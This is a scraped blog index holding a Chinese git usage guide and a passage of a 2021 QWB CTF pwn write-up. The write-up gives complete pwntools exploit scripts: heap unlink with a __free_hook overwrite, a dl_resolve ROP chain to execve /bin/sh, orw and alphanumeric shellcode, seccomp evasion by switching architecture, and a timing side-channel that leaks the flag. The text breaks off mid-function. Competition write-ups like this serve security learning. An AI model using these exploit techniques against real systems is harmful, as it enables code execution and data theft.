filecrashlytics-build.propertiesAssets/PluginsAssets/Plugins.metaAssets/StreamingAssetsAssets/StreamingAssets.metaAssets/ThirdPartyAssets/ThirdParty.metaAssets/K2ExamplesAssets/K2Examples.metaNuiDatabaseobjmsc.vs*.jpg*.dllOpenNI2*.ini*.data\n\n\n\n合作工程多日参与git项目编写时，得需要注意某些事项。\n编写代码之前注意事项每次写代码或者修改文件之前，先git pull一下，确保当前代码状态是最新的，这样之后出现冲突的几率少一些，改冲突也没那么麻烦了。\n编写代码之后注意事项修改了一些重要代码文件之后，尽快push到远程仓库。\n提交步骤\n先对自己修改的文件打Commit，\n再点击Fetch，\n之后有Pull的话也点击Pull，\n最后Push\n\n出现冲突解决步骤：先打commit，再pull，打开文件解决冲突 ， push\nGit撤销&amp;回滚操作开发过程中，你肯定会遇到这样的场景：\n场景一：\n糟了，我刚把不想要的代码，commit到本地仓库中了，但是还没有做push操作！\n\n场景二：\n彻底完了，刚线上更新的代码出现问题了，需要还原这次提交的代码！\n\n场景三：\n刚才我发现之前的某次提交太愚蠢了，现在想要干掉它！\n\n撤销上述场景一，在未进行git push前的所有操作，都是在“本地仓库”中执行的。我们暂且将“本地仓库”的代码还原操作叫做“撤销”！\n情况一：文件被修改了，但未执行git add操作(working tree内撤销)\ngit checkout fileNamegit checkout .\n\n情况二：同时对多个文件执行了git add操作，但本次只想提交其中一部分文件\n$ git add *$ git status# 取消暂存$ git reset HEAD &lt;filename&gt;\n\n情况三：文件执行了git add操作，但想撤销对其的修改（index内回滚）\n# 取消暂存git reset HEAD fileName# 撤销修改git checkout fileName\n\n情况四：修改的文件已被git commit，但想再次修改不再产生新的Commit\n# 修改最后一次提交 $ git add sample.txt$ git commit --amend -m&quot;说明&quot;\n\n情况五：已在本地进行了多次git commit操作，现在想撤销到其中某次Commit\ngit reset [--hard|soft|mixed|merge|keep] [commit|HEAD]\n\n回滚上述场景二，已进行git push，即已推送到“远程仓库”中。我们将已被提交到“远程仓库”的代码还原操作叫做“回滚”！*注意：对远程仓库做回滚操作是有风险的，需提前做好备份和通知其他团队成员！*\n如果你每次更新线上，都会打tag，那恭喜你，你可以很快的处理上述场景二的情况\ngit checkout &lt;tag&gt;\n\n如果你回到当前HEAD指向\ngit checkout &lt;branch_name&gt;\n\n情况一：撤销指定文件到指定版本\n# 查看指定文件的历史版本git log &lt;filename&gt;# 回滚到指定commitIDgit checkout &lt;commitID&gt; &lt;filename&gt;\n\n情况二：删除最后一次远程提交\n方式一：使用revert\ngit revert HEADgit push origin master\n\n方式二：使用reset\ngit reset --hard HEAD^git push origin master -f\n\n二者区别：\n\nrevert是放弃指定提交的修改，但是会生成一次新的提交，需要填写提交注释，以前的历史记录都在；\nreset是指将HEAD指针指到指定提交，历史记录中不会出现放弃的提交记录。\n\n情况三：回滚某次提交\n# 找到要回滚的commitIDgit loggit revert commitID\n\n删除某次提交git log --oneline -n5git rebase -i ``&quot;commit id&quot;``^\n\n注意：需要注意最后的^号，意思是commit id的前一次提交\ngit rebase -i &quot;5b3ba7a&quot;^\n\n在编辑框中删除相关commit，如pick 5b3ba7a test2，然后保存退出（如果遇到冲突需要先解决冲突）！\ngit push origin master -f\n\n通过上述操作，如果你想对历史多个commit进行处理或者，可以选择git rebase -i，只需删除对应的记录就好。rebase还可对 commit 消息进行编辑，以及合并多个commit。\ngit reset –hard HEAD^\n加引号：git reset -hard &quot;HEAD^&quot;加一个^：git reset -hard HEAD^^换成：&#96;git reset –hard HEAD或者git reset –hard HEAD1  &#96; 后面的数字表示回退几次提交，默认是一次\nref: https://www.cnblogs.com/heqiyoujing/p/10461015.html\n","categories":["env"],"tags":["git"]},{"title":"2021 强网杯PWN部分WP","url":"/2021/06/25/security/ctf/compitation/wp-qwb-2021/","content":"2021 强网杯PWN 部分WP最终官方排名:23\nbaby_diary漏洞点\n__int64 __fastcall sub_132B(__int64 a1, int a2, char a3)&#123;  int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; i &lt; a2; ++i )  &#123;    if ( (int)read(0, (void *)(i + a1), 1uLL) &lt;= 0 )    &#123;      puts(&quot;read error&quot;);      exit(0);    &#125;    if ( a3 == *(_BYTE *)(i + a1) )      break;  &#125;  *(_BYTE *)(i + a1) = 0;                      //设置最后一个至为0  return (unsigned int)i;&#125;\n\n\n\n执行完编辑函数，可以修改最后一个字节的low_byte位\nvoid __fastcall sub_1528(unsigned int idx, int n)&#123;  __int64 v2; // [rsp+10h] [rbp-8h]  if ( idx &lt;= 0x18 &amp;&amp; bufs[idx] )  &#123;    v2 = bufs[idx];    flags[idx] = n;    if ( n )      *(_BYTE *)(n + 1LL + v2) = (*(_BYTE *)(n + 1LL + v2) &amp; 0xF0) + sub_146E(idx); // n若为开辟内存大小的话，存在溢出， 修改低4位  &#125;&#125;\n\n\n\n然而sub_146E函数根据下面算法计算的，若大于0x0f的话，就不能构造结果为0，这有点坑。\n__int64 __fastcall sub_146E(unsigned int a1)&#123;  int i; // [rsp+10h] [rbp-14h]  unsigned int v3; // [rsp+14h] [rbp-10h]  if ( a1 &gt; 0x18 || !bufs[a1] )    return 0xFFFFFFFFLL;  v3 = 0;  for ( i = 0; i &lt; flags[a1]; ++i )    v3 += *(unsigned __int8 *)(i + bufs[a1]);  while ( v3 &gt; 0xF )    v3 = (v3 &gt;&gt; 4) + (v3 &amp; 0xF);  return v3;&#125;\n\n\n\n漏洞综述，最后字节用’\\x00’截断，4bit位溢出。\nglibc 2.31下绕过unlink，稍微有点难构造，加上本身程序逻辑，更难构造了，各种层层构造关联太强了，但最后还是找的了某些地址，成功构造利用链子，这需要控制很好的地址的值，比如实现unlink时，prev_size 要满足 0x100的倍数，不然不好设置我们unlink chunk size低3位为 0，还有构造unlink的fd-&gt;bk 指向自己本身，bk-&gt;fd指向自己本身，然而程序有点烦人的是最后一字节为’\\x00’截断的，后面有4bit位溢出，这使得我们伪造chunk的fd必需要为0x100的整数倍才行。实现unlink之后就实现了堆重叠，泄漏Libc然后再修改__free_hook为system函数，至于glibc 2.31下如何绕过unlink，它与2.29一样的，多了个 prev_size &#x3D;&#x3D; chunk_size的检查，这就比较麻烦， 可以参考这篇博客:https://bbs.pediy.com/thread-257901-1.htm 。\n下面是我重重构造，实现unlink的信息\n0x5555dc297300 —▸ 0x5555dc297dd0 —▸ 0x7f8e6ac39ca0 (main_arena+96) ◂— 0x5555dc29730\n\n\n\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0gan# ref: https://bbs.pediy.com/thread-257901-1.htmfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;./baby_diary&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;8.140.114.72:1399&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def ad(sz, d):    sla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)    sla(&#x27;:&#x27;, str(sz))    if(sz &gt; 0):        sa(&#x27;:&#x27;, d)def dp(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(idx))def rm(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)    sla(&#x27;:&#x27;, str(idx))#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    for i in range(7): # 0-6        ad(0x1000, &quot;padding\\n&quot;)    #ad(0x1000-0x210 + 0x70 , &quot;padding\\n&quot;) # 7 glibc 2.29    ad(0x1000-0x210 + 0x70 -0x40, &quot;padding\\n&quot;) # 7 glibc 2.31    for i in range(7): # 8-14        ad(0x28, &#x27;t\\n&#x27;)    ad(0x1b20, &quot;largebin\\n&quot;) # 15    ad(0x20, &quot;padding\\n&quot;) # 16    rm(15)    ad(0x2000, &#x27;\\n&#x27;) # 15    ad(0x28, p64(0) + p64(0x601) + b&#x27;\\n&#x27;) # idx:17 get a chunk from largebin    ad(0x28, &#x27;a\\n&#x27;) # 18    ad(0x28, &#x27;b\\n&#x27;) # 19    ad(0x38 + 0x300, &#x27;c\\n&#x27;) # 20    ad(0x28, &#x27;d\\n&#x27;) # 21    ad(0x28, &#x27;e\\n&#x27;) # 22 for not merge         # fill in tcache_entry[1](size: 0x30)    t = 9    for i in range(7): # 8-14        rm(8 + i)    rm(18) # t    rm(20)    rm(21)    # clear tcache_entry[1](size: 0x30)    for i in range(7): # 8-14        ad(0x28, &#x27;\\n&#x27;)    # fastbin to smallbin    ad(0x450, &#x27;\\n&#x27;) #18    # get a chunk from smallbin , another smallbin chunk to tcache    # 20, change fake chunk&#x27;s fd-&gt;bk to point to fake chunk    ad(0x28,  b&#x27;\\x03&#x27; + b&#x27;\\x00&#x27; * 7 + b&#x27;\\n&#x27;)    # clear chunk from tcache    ad(0x28, &#x27;clear\\n&#x27;) # 21         for i in range(7): # 8-14        rm(8 + i)                  # free to fastbin    rm(19)    rm(17)                   for i in range(7): # 8-14        ad(0x28, &#x27;\\n&#x27;)                            # change fake chunk&#x27;s bk-&gt;fd    ad(0x28, b&#x27;\\n&#x27;) # 17    # Make house of einherjar    rm(18)    for i in range(6): # 8-14        rm(8 + i)    ad(0x170, &#x27;\\n&#x27;) # 8    ad(0x450, &#x27;\\n&#x27;) # 9    ad(0x60, &#x27;\\n&#x27;)  # 10        rm(8)    ad(0x177, b&#x27;\\x00&#x27; * 0x177) # 8    rm(8)    ad(0x177, (b&#x27;\\x00&#x27; * 0x16f) + b&#x27;\\x06&#x27; + b&#x27;\\n&#x27;) # 8    # unlink    rm(9)    # leak libc     ad(0x430, &#x27;\\n&#x27;) # 9    dp(22)     leak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)    libc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 - 96    system = libc_base + libc.sym[&#x27;system&#x27;]    free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]    li(&#x27;libc_base: &#x27; + hex(libc_base))    #ad(0x17, p64(free_hook) + b&#x27;\\n&#x27;)    for i in range(3):        ad(0x28, b&#x27;\\n&#x27;)            rm(20) #     rm(0) # for clean    rm(1) # for clean    ad(0x18, &#x27;/bin/sh\\n&#x27;)    rm(9) #    ad(0x430, b&#x27;A&#x27; * 0x400 + p64(free_hook) + p64(0) + b&#x27;\\n&#x27;)     ad(0x28, &#x27;\\n&#x27;)    ad(0x28, p64(system) + b&#x27;\\n&#x27;)    db()    rm(0)    # double free    #rm(0)\t&#x27;&#x27;&#x27;    rm(9)    ad(0x37, b&#x27;\\x00&#x27; + b&#x27;\\x00&#x27; * 0x30 + b&#x27;\\x50&#x27; + b&#x27;\\n&#x27;)    &#x27;&#x27;&#x27;    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\n\n\nnoout没有打印函数，通过’\\x00’字节绕过字符串比较\n__sighandler_t sub_8049424()&#123;  __sighandler_t result; // eax  char src[32]; // [esp+Ch] [ebp-5Ch] BYREF  char buf[48]; // [esp+2Ch] [ebp-3Ch] BYREF  const char *v3; // [esp+5Ch] [ebp-Ch]  init_();  v3 = &quot;tell me some thing&quot;;  read(0, buf, 0x30u);  v3 = &quot;Tell me your name:\\n&quot;;  read(0, src, 0x20u);  sub_80493EC(src);  strcpy(dest, src);  v3 = &quot;now give you the flag\\n&quot;;  read(unk_804C080, src, 0x10u);  result = (__sighandler_t)str_cmp(src, off_804C034);// 字符串比较  if ( !result )    result = sub_8049269();  return result;&#125;\n\n\n\n再利用计算错误抛出SIGFPE信号使调用漏洞函数\n__sighandler_t sub_8049269()&#123;  __sighandler_t result; // eax  void (*v1)(int); // [esp+0h] [ebp-18h] BYREF  int v2[2]; // [esp+4h] [ebp-14h] BYREF  const char *v3; // [esp+Ch] [ebp-Ch]  v3 = &quot;give me the soul:&quot;;  __isoc99_scanf(&quot;%d&quot;, v2);  v3 = &quot;give me the egg:&quot;;  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  result = v1;  if ( v1 )  &#123;    signal(8, (__sighandler_t)vuln);            // set handler                                                // SIGFPE 表示一个算数运算异常    v2[1] = v2[0] / (int)v1;                    // 使运算异常调用漏洞函数    result = signal(8, 0);  &#125;  return result;&#125;\n\n\n\nssize_t vuln()&#123;  char buf[68]; // [esp+0h] [ebp-48h] BYREF  return read(0, buf, 0x100u);                  // stack overflow&#125;\n\n漏洞函数中就是简单的堆栈溢出了，采用dl_runtime_resolve攻击。\nexp#!/usr/bin/env python2#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *from roputils import ROPimport os# roputils: https://github.com/inaz2/roputils/blob/master/roputils.pyr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;./test&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;39.105.138.97:1234&quot;# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    s(&#x27;\\x00&#x27; * 0x30)    #db()    # make calc error    s(&#x27;\\x00&#x27; * 0x20)    sl(str(-0xcccccccc))    #db()    sl(str(-1))    # vuln, stack overflow    rop  = ROP(elf_path)    buf  = elf.bss()    pop3 = 0x08049581    p = b&#x27;\\x00&#x27; * 0x4C    p += p32(elf.sym[&#x27;read&#x27;])    p += p32(pop3)    p += p32(0)    p += p32(buf)    p += p32(0x80)    p += rop.dl_resolve_call(buf + 0x10, buf, 0, 0) # call, args    sleep(0.5)    s(p)    # dl resolve data     p = &#x27;/bin/sh\\x00&#x27;.ljust(0x10, &#x27;\\x00&#x27;)    p += rop.dl_resolve_data(buf + 0x10, &#x27;execve&#x27;)    p = p.ljust(0x80, &#x27;\\x00&#x27;)    sleep(1)    sl(p)    #sleep(0.1)    #sl(p)    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\n\n\norw一个伪heap题，开启了沙箱，编辑和打印功能没有，只能开辟两次堆，释放一次，没办法进行堆操作。\n存在个index 负数溢出，可以实现修改got表，为堆地址。\n__int64 sub_E44()&#123;  int idx; // [rsp+0h] [rbp-10h]  int size; // [rsp+4h] [rbp-Ch]  if ( add_nums &lt;= 1 )  &#123;    puts(&quot;index:&quot;);    idx = inputn();    puts(&quot;size:&quot;);    size = inputn();    if ( size &gt;= 0 &amp;&amp; size &lt;= 8 &amp;&amp; idx &lt;= 1 )   // index overflow    &#123;      bufs[idx] = malloc(size);      if ( !bufs[idx] )      &#123;        puts(&quot;error&quot;);        exit(0);      &#125;      puts(&quot;content:&quot;);      readn((_BYTE *)bufs[idx], size);      ++add_nums;    &#125;  &#125;  return add_nums;&#125;\n\n查看程序架构\nArch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX disabledPIE:      PIE enabledRWX:      Has RWX segments\n\nchecksec发现存在rwx段，但发现是stack上的，想了半天没想通如何跳到堆栈那里去。\n试试在堆上写shellcode，然后index溢出漏洞修改atoi的got地址为shellcode堆地址，跳到堆中执行指令，然而发现远程能执行，但自己本地不行，接下来就是orw的汇编指令编写了。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./pwn&#x27;libc_path = &#x27;./libc.so.6&#x27;#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;# remote server ip and porthost = &quot;39.105.131.68:12354&quot;#io = process(elf_path, env = &#123;&#x27;LD_PRELOAD&#x27;: libc_path&#125;)io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))libc = ELF(libc_path)#--------------------------func-----------------------------def db():    gdb.attach(io)def ad(idx, sz, d):    sla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)    sla(&#x27;:&#x27;, str(idx))    sla(&#x27;:&#x27;, str(sz))    sa(&#x27;:&#x27;, d)def dp(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)def md():    sla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)def rm(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)    sla(&#x27;:&#x27;, str(idx))#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    #for i in range(2):    # wirte    code = &#x27;&#x27;&#x27;    lea r15, [rip + 0xf9] /* buf */    mov rdi, r15 /*buf*/    mov rsi, 0x0     mov rdx, 0x0    mov rax, 2    syscall    /*read*/    mov rdi, 3    mov rsi, r15    mov rdx, 0x100    mov rax, 0    syscall    /*write*/    mov rdi, 1    mov rax, 1    syscall    &#x27;&#x27;&#x27;    p = asm(code, arch = &#x27;amd64&#x27;)    p = p.ljust(0x100, b&#x27;\\x00&#x27;)    p += b&#x27;./flag\\x00&#x27;    ad(-14, 0, p + b&#x27;\\n&#x27;)#    db()    # call    sla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)    def finish():    ia()    c()exploit()finish()\n\n\n\n\n\nshellcode沙箱检查如下\n line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008 0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008 0007: 0x06 0x00 0x00 0x00000000  return KILL 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n\n输入的shellcode有检查\nfor ( i = 0; i &lt; v6; ++i )&#123;   if ( v4[i] &lt;= 31 || v4[i] == &#x27;\\x7F&#x27; )     goto LABEL_10;&#125;\n\n也就是机器码字符小于等于’\\x31’的就退出或等于’\\x7f’，我们可以采用alpha3工具将机器码生成可显示字符，当然这个工具有限制，机器码不能出现’\\x00’，通过调试发现，shellcode的基址存放在rbx上，我们先实现一个输入的shellcode，避免后续不会再进行shellcode过滤。\ncode = &#x27;&#x27;&#x27;   mov r15, rbx   xor rdx, rdx   add dx, 0x1080   mov rsi, r15   add si, 0x120   xor rax, rax   syscall   jmp rsi   &#x27;&#x27;&#x27;\n\n在原来的shellcode + 0x120处实现输入，再跳到那个地方去。\n采用alpha3工具生成可显示shellcode如下\nSh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8k1L0I3z2m4p4N4p0Y1O3c8L2k4u4v2t0O1L0A400V044p3E0c\n\n当然我也写了个函数方便修改。\ndef gen_code():    fd = open(&#x27;sc.bin&#x27;, &#x27;wb&#x27;)    code = &#x27;&#x27;&#x27;    mov r15, rbx    xor rdx, rdx    add dx, 0x1080    mov rsi, r15    add si, 0x120    xor rax, rax    syscall    jmp rsi    &#x27;&#x27;&#x27;    p = asm(code, arch = &#x27;amd64&#x27;)    fd.write(p)    fd.close()    cmd = &#x27;~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=&quot;./sc.bin&quot;&#x27;    p = os.popen(cmd).read()    print(&#x27;shellcode: &#x27; + p)    return p\n\n\n\n然而这个题禁用函数太多了，open和write也禁了，只能切换到32位架构来实现部分绕过了，为了方便实现堆栈，指令储存，我重新申请了个地址段，方便后续实现架构切换方便与数据写入等。\ncode = &#x27;&#x27;&#x27;   /*mmap*/   mov r9d, 0          /* off */   mov r8d, 0xFFFFFFFF /* fd */    mov r10d, 0x22 /* flags */   mov edx, 7          /* prot */   mov esi, 0x1000      /* len */   mov edi, 0x20000          /* addr */   mov eax, 9   syscall    /*read 32 shellcode*/   xor rax, rax   mov edi, 0   mov esi, 0x20000   mov edx, 0x1000    syscall   /*retf to 32*/   mov rax, 0x2300020000   push rax   &#x27;&#x27;&#x27;   p = asm(code, arch = &#x27;amd64&#x27;)   p += b&#x27;\\xCB&#x27; # retf\n\n上面是实现向我们开辟到的内存写入数据，再从64位架构切换到32为且跳到我们开辟的内存段中。\n后面就是写32位的asm code了，然而我发现，在32位下，只有一个有用的函数能调用，就是open函数，其他的read，write这些都不能调用了，这又使得重新回到64位下实现读入flag。\ncode = &#x27;&#x27;&#x27;   mov esp, 0x20a00   /*open*/   mov eax, 5    mov ebx, 0x20020   xor ecx, ecx   xor edx, edx   int 0x80   /*retf to 64*/   push 0x33   push 0x20030   &#x27;&#x27;&#x27;   db()   p = asm(code, arch = &#x27;i386&#x27;)   p += b&#x27;\\xCB&#x27; # retf   p = p.ljust(0x20, b&#x27;\\x90&#x27;)   p += b&#x27;./flag\\x00&#x27;   p = p.ljust(0x30, b&#x27;\\x90&#x27;)   code = &#x27;&#x27;&#x27;    xor rax, rax   mov edi, 3   mov rsi, rsp   mov edx, 0x100   syscall   &#x27;&#x27;&#x27;\n\n\n\n由于不能使用write的系统调用，只能采用延时爆破了\nif idx == 0:       code += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(idx, ch)   else:       code += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(idx, ch)\n\nidx为读入的字符偏移，ch是我们猜测的字符，若想等，就进入死循环，否则就退出。\n通过时间来判断是否想等。\n总结:\n自己踩了很多坑，shellcode必须为可显字符，后面绕过了，只能用少量的系统函数，64位架构时，只能使用read, mmap, fstat，我还以为切换架构到32位可以绕过syscall检测，想不到只允许调用open， 其他的read和write都不行，又重新切换到64位来执行read，再采用延时爆破读出来。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)#context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;./shellcode&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;39.105.137.118:50050&quot;# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def gen_code():    fd = open(&#x27;sc.bin&#x27;, &#x27;wb&#x27;)    code = &#x27;&#x27;&#x27;    mov r15, rbx    xor rdx, rdx    add dx, 0x1080    mov rsi, r15    add si, 0x120    xor rax, rax    syscall    jmp rsi    &#x27;&#x27;&#x27;    p = asm(code, arch = &#x27;amd64&#x27;)    fd.write(p)    fd.close()    cmd = &#x27;~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=&quot;./sc.bin&quot;&#x27;    p = os.popen(cmd).read()    print(&#x27;shellcode: &#x27; + p)    return p#--------------------------exploit--------------------------# ref: https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/tqpsqr# ref: https://blog.csdn.net/SmalOSnail/article/details/105236336# ref: http://blog.leanote.com/post/xp0int/%5BPwn%5D-Steak-cpt.shao# ref: https://zhuanlan.zhihu.com/p/57648345#  ~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=&quot;sc.bin&quot; &gt; odef exploit(idx, ch):    li(&#x27;exploit...&#x27;)    &#x27;&#x27;&#x27;    git clone https://github.com/TaQini/alpha3.git    cd alpha3    python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot;    rax: shellcode base_address    &#x27;&#x27;&#x27;    # python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot;    #p = gen_code()    p = &#x27;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8k1L0I3z2m4p4N4p0Y1O3c8L2k4u4v2t0O1L0A400V044p3E0c&#x27;    s(p)    code = &#x27;&#x27;&#x27;    /*mmap*/    mov r9d, 0          /* off */    mov r8d, 0xFFFFFFFF /* fd */     mov r10d, 0x22 /* flags */    mov edx, 7          /* prot */    mov esi, 0x1000      /* len */    mov edi, 0x20000          /* addr */    mov eax, 9    syscall     /*read 32 shellcode*/    xor rax, rax    mov edi, 0    mov esi, 0x20000    mov edx, 0x1000     syscall    /*retf to 32*/    mov rax, 0x2300020000    push rax    &#x27;&#x27;&#x27;    p = asm(code, arch = &#x27;amd64&#x27;)    p += b&#x27;\\xCB&#x27; # retf    #p += p32(0x400000) + p32(0x23) # ret addr + 0x23:32bit sign    sleep(0.01)    s(p)    code = &#x27;&#x27;&#x27;    mov esp, 0x20a00    /*open*/    mov eax, 5     mov ebx, 0x20020    xor ecx, ecx    xor edx, edx    int 0x80    /*retf to 64*/    push 0x33    push 0x20030    &#x27;&#x27;&#x27;    db()    p = asm(code, arch = &#x27;i386&#x27;)    p += b&#x27;\\xCB&#x27; # retf    p = p.ljust(0x20, b&#x27;\\x90&#x27;)    p += b&#x27;./flag\\x00&#x27;    p = p.ljust(0x30, b&#x27;\\x90&#x27;)    code = &#x27;&#x27;&#x27;     xor rax, rax    mov edi, 3    mov rsi, rsp    mov edx, 0x100    syscall    &#x27;&#x27;&#x27;    if idx == 0:        code += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(idx, ch)    else:        code += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(idx, ch)    p += asm(code, arch = &#x27;amd64&#x27;)    sleep(0.01)    s(p)    start = time.time()    try:        io.recv(timeout = 2)    except:        pass    end = time.time()    if (end - start &gt; 1.5):        return ch    else:        return Nonedef finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    flag = &#x27;&#x27;    idx = 3    while True:        for ch in range(0x20, 127):            if LOCAL:                elf = ELF(elf_path)                if LIBC:                    libc = ELF(libc_path)                io = elf.process()            else:                elf = ELF(elf_path)                io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))                if LIBC:                    libc = ELF(libc_path)            ret = exploit(idx, ch)            if(ret != None):                li(&#x27;found: &#x27; + chr(ch))                flag += chr(ch)                li(&#x27;flag: &#x27; + flag)                idx += 1            io.close()\n\n\n\n\n\npipeline没有free函数，通过设置大小为0即可实现释放内存功能。\n找了偏移，chunk头部链表逻辑，没有发现漏洞，在编辑数据的功能中，发现了个整型溢出漏洞。\n漏洞点\n_QWORD *edit_body()&#123;  _QWORD *result; // rax  int size; // eax  int index; // [rsp+10h] [rbp-10h]  int v3; // [rsp+14h] [rbp-Ch]  _QWORD *buf; // [rsp+18h] [rbp-8h]  index = 